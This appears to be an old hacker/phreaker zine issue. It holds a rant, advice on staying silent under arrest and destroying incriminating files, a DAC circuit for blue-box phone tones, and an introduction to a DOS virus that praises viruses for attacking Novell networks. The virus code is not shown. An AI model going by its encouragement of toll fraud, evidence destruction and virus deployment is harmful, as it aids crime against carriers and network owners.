HarLeQuin sayz:
        Right, I guess you're thinking, 'Oh another h/p group that's 
gonna be around for a couple o' months before disappearing in a flurry 
of vitriolic slagging and allegations'. Well you're probably right. But 
dah thing is...

                            WE DON'T GIVE A F%@# !

        We're having a laff and apart from getting in a bit of serious 
debauchery and technology abuse we're here to have FUN and to give 'em 
something to type about on IRC. So to start dah ball rolling... 
Harlequin is a narq and he shags various small mammals. I have faked 
ASCEE docs to prove it. I'll even go on IRC and say 'Hey Harl got me and 
my 4,000 strong h/p group busted last week just so he could get off 
loading dah dishwasher' and everyone will go 'Yeah ?!?!?!? Well I better 
slag him off so I dont look lame in front of all dah 3l33t haqrz 0n 
|-|3r3' and then when I suck up enough to dah plus oh posse & eYe g3t 
0pz I'll ban him just to show what an 3l33t |-|aQr eYe Am !! Itz all 
true ! I swear ! I read it in dah /etc/true_things dir on 
eleet.haqrz.hangout

        Anyway, being mostly pissed off with the shit that gets thrown 
around I dont really give a f**k what ppl say about me 'cos 99.99% of it 
isn't true. So if you want to let everyone know I'm a lamer/sheep 
shagger/narq/warez d00d feel free ! You're wasting yah ASCEE keystrokes, 
save it for someone who gives half a toss.

On a more light hearted note - hope ya enjoy the rest of the text...

                                Getting Nicked
                                ~~~~~~~~~~~~~~
                    or what to do when you're arrested...
                    
Did you know over 70% of all convictions are made on the basis of what 
was said in the interview. What does this mean practically ??

                         WHEN TALKED TO  ---> SHUT UP

        Yep that's it. I know this is going to be mind-blastingly hard, 
especially for Phreaks who have an innate ability to talk constantly. 
But hopefully the lack of a telephone in the vicinity may keep you 
quiet. You simply answer 'No Comment' to *ANY* interview questions 
asked. Also the Police may start chatting to you informally when you're 
in the police car/holding cell/police custody cell/anywhere else. Don't 
give them any information that can help them. This means basically 
shutting up and answering only stuff such as you're name, address and 
other such formalities. They can't use this idle chat as evidence 
against you, but if they think you're innocent then they're gonna stop 
looking for evidence but if you say 'Yeah I did it copper and you can't 
prove nuthin' 'cos this aint recorded ha ha ha !' the're gonna keep 
looking until they find something.

        Answering 'No Comment' as a reply to an interview question is 
not an admission of guilt. If you're case goes to trial the interview 
tape will be played, and if you answer 'No Comment' to a question it's 
as if the question had not been asked. The prosecution cannot base 
anything on the fact you did not wish to answer the question. Another 
ploy the police will use is the bribery tactic... i.e. 'We have you're 
mates and they all said you did it - so unless you tell us something 
you're going down forever' - again no comment, this is a ploy just to 
get you to talk. Ratting on yer mates because they're gonna let you off 
easier is not only likely to get you lynched as soon as you walk out the 
door, but it also won't work, so don't try it. Also they will try and 
outrage you into defending yourself i.e. 'You have broken into 
Government computers and have defrauded more then 50,000 quids worth of 
stuff haven't you ??'. This is another ploy to make you go 'No way I 
haven't done anything like that!' - bite your tongue, they will simply 
try to get you talking.

        Being in a police cell is a completely miserable experience and 
being told 'If you tell us something you can be on the next bus outta 
here' is an extremely attractive prospect after being locked up in a 6x4 
room for 8 hours. But all these are all cunning psychological tricks 
used to get convictions (after all this is what they're paid for).

        And finally... You have been bright enough to PGP encrypt all 
your sensitive info with a 1024 bit key and a bloody long password 
haven't you ??? And you have completely shredded all unwanted dodgy 
stuff haven't you ?? (Yeah, not just deleted - electronically SHREDDED). 
It might be worth mentioning that if you're HD is compressed with 
Stacker or any other compression utility then its almost impossible to 
completly erase deleted files by writing over them....

        This advice is not just stuff from the top of my head. It's from 
experience - bitter experience. The bright thing to do is not to get 
nicked in the first place either by:- 

a) Not breaking the law 
b) Having half a brain and not getting caught

                                 Plans for a
                          Digital -> Audio Convertor
                          ~~~~~~~~~~~~~~~~~~~~~~~~~~

        Some of you poorer phreaks may have noticed blue boxing is 
pretty impossible without a soundcard for your beloved PC or without 
being able to solder a circuit without burning your ear with the 
soldering iron. Anyway, this is a very simple circuit that produces 
perfect tones. Although it isn't new or cutting edge, its been included 
in Citronic for convenience sake, as when I was looking for it (quite 
some time ago) I couldn't find the circuit diagram anywhere. This will 
cost you a couple of quid/few dollars so is very cheap. When its built, 
attach it to your parallel port. Please note: the output has to be 
attached to an amplifier. My CD player works perfectly for this, most 
stereos will do.

This circuit requires:
9 x 20K resistors
9 x 10K resistors 
1 x 100 MFD capacitor  
25 pin DShell plug

        All the resitors are 1/4 watt and 1% tolerance. Make sure these 
are exact as the first DAC I built had 5% tolerance resistors and was 
crap. You might also want to add a female RCA plug to have a convenient 
way to connect it to an amplifier. The entire circuit can be built on 
the back of the 25 pin plug. Be sure to connect the two points labeled 
0v. No power supply is required. This circuit was included in an Amiga 
mod file player package by Mark J. Cox. He acknowledges Harry Stox for 
the circuit.

          Printer Port:

        Almost my entire phreaking career was using this device so it 
does work ! I recommend BlueDial software, its free and supports DACs. 
The current version at the time of writing is BDial v 6.1 Also there is 
alot of software around that lets you play/edit Amiga .MOD filez thru a 
DAC (just in case you're interested)

                                The Fade Virus
                              A Simple Dos Virus
                              ~~~~~~~~~~~~~~~~~~

        Viruses are usually ignored by hackers as 'novelties' or 'toys' 
but in fact they can be extremely useful. Especially when attacking DOS 
based network systems such as Novel. 
        They are also an excellent way to learn assembly language (for 
any platform) as you can go from very simple viruses to extremely 
complicated ones that require a working knowledge of the platform, 
whether documented or not. 
        They are also an artform, check out some of NuKE's/Phalcon 
Skism's work for some excellent examples. 
        Any common criminal with a copy of FORMAT can cause damage. Get 
creative - destructive viruses get a lame rating of 99. 8% Finally, if 
you want to get into this virus thing, check out #virus on IRC or 
Aristotle's BBS, Black Axis on (804) 599-4152. 40HEX magazine (by 
Skism/Phalcon) and NuKE Info Journals are a mine of information, if you 
can get hold of them.
        Anyway, I have included a totally original, very simple virus I 
wrote some time ago. I made it as simple as possible so it's easy to 
learn from and adapt. It's easily modified and very easy to understand. 
So have a play around with it and see what you can come up with.
